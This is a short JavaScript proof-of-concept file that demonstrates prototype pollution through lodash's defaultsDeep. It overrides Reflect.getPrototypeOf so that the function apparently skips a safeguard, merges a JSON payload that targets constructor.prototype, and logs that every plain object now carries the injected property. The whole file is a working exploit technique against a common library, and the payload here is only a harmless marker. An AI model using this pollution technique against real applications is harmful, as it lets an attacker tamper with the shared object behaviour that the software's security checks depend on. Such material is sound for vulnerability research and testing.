Reflect.getPrototypeOf = () => false;
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"polluted": "yes"}}}';
console.log({}.polluted);
mergeFn({}, JSON.parse(payload));
console.log({}.polluted);